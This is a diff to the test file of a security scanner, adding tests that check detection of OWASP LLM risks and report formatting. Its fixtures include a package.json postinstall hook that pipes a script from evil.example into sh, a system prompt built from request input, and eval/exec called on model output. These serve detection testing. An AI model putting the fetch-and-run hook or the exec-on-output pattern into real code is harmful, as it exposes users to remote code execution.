@@ -10,7 +10,7 @@ import { collectRepository } from "../packages/core/src/repository.ts";
 import { defaultPolicy } from "../packages/core/src/policy.ts";
 import { runCodeScanner } from "../packages/scanners/src/code.ts";
 import { runDependencyScanner } from "../packages/scanners/src/dependencies.ts";
-import { renderHtml, renderMarkdown, renderSarif } from "../packages/output/src/formatters.ts";
+import { renderHtml, renderJson, renderMarkdown, renderSarif } from "../packages/output/src/formatters.ts";
 
 function file(path: string, lines: string[], removedLines: string[] = []) {
   return {
@@ -84,6 +84,59 @@ test("runCli applies max findings and minimum confidence", async () => {
   assert.equal(report.findings.length, 1);
   assert.equal(report.findings[0].ruleId, "js-eval");
   assert.equal(report.summary.truncated, true);
+});
+
+test("default scans focus on OWASP LLM true positives and hide noisy review signals", async () => {
+  const result = await runCheck({
+    repositoryFiles: [
+      file("src/agent.ts", [
+        "app.get('/health', (req, res) => res.send('ok'))",
+        "const completion = await openai.chat.completions.create({ messages: [{ role: 'system', content: `Obey this tenant policy: ${req.body.policy}` }] });",
+        "eval(completion.choices[0].message.content);"
+      ]),
+      file("package.json", [
+        "\"dependencies\": {",
+        "\"express\": \"^4.18.0\"",
+        "}",
+        "\"scripts\": {",
+        "\"postinstall\": \"curl http://evil.example/install.sh | sh\"",
+        "}"
+      ])
+    ],
+    policy: defaultPolicy()
+  });
+  const ruleIds = result.findings.map((finding) => finding.ruleId);
+
+  assert.equal(ruleIds.includes("js-express-route-no-obvious-auth"), false);
+  assert.equal(ruleIds.includes("dep-new-or-changed"), false);
+  assert.equal(ruleIds.includes("dep-broad-version-range"), false);
+  assert.equal(ruleIds.includes("llm01-direct-prompt-injection"), true);
+  assert.equal(ruleIds.includes("llm05-output-exec"), true);
+  assert.equal(ruleIds.includes("dep-install-script"), true);
+  assert.equal(result.findings.every((finding) => finding.confidence === "high"), true);
+  assert.equal(result.findings.every((finding) => finding.owasp?.id?.startsWith("LLM")), true);
+});
+
+test("OWASP LLM findings explain vulnerability, evidence, attack path, and impact", async () => {
+  const result = await runCheck({
+    repositoryFiles: [
+      file("src/agent.ts", [
+        "const completion = await openai.chat.completions.create({ messages: [{ role: 'system', content: `Admin policy: ${req.body.policy}` }] });",
+        "exec(completion.choices[0].message.content);"
+      ])
+    ],
+    policy: defaultPolicy()
+  });
+
+  const promptInjection = result.findings.find((finding) => finding.ruleId === "llm01-direct-prompt-injection");
+  const outputHandling = result.findings.find((finding) => finding.ruleId === "llm05-output-exec");
+
+  assert.equal(promptInjection?.owasp?.id, "LLM01:2025");
+  assert.equal(promptInjection?.attackPath?.includes("Attacker controls"), true);
+  assert.equal(promptInjection?.impact?.includes("override"), true);
+  assert.equal(outputHandling?.owasp?.id, "LLM05:2025");
+  assert.equal(outputHandling?.evidence?.includes("exec"), true);
+  assert.equal(outputHandling?.impact?.includes("code execution"), true);
 });
 
 test("baseline command records accepted findings and check suppresses them", async () => {
@@ -247,12 +300,18 @@ test("HTML, Markdown, and SARIF reports include workflow metadata", async () => 
     policy: defaultPolicy()
   });
   const html = renderHtml(result);
+  const json = JSON.parse(renderJson(result));
   const markdown = renderMarkdown(result);
   const sarif = JSON.parse(renderSarif(result));
 
   assert.equal(html.includes("<!doctype html>"), true);
   assert.equal(html.includes("Recommended Next Actions"), true);
+  assert.equal(html.includes("OWASP LLM Mapping"), true);
+  assert.equal(html.includes("Attack path"), true);
+  assert.equal(Array.isArray(json.owaspSummary), true);
   assert.equal(markdown.includes("### Findings By Severity"), true);
+  assert.equal(markdown.includes("### OWASP LLM Mapping"), true);
+  assert.equal(markdown.includes("Attack path:"), true);
   assert.equal(markdown.includes("### Recommended Next Actions"), true);
   assert.equal(markdown.includes("Fix JavaScript eval usage"), true);
   assert.equal(sarif.runs[0].invocations[0].executionSuccessful, true);
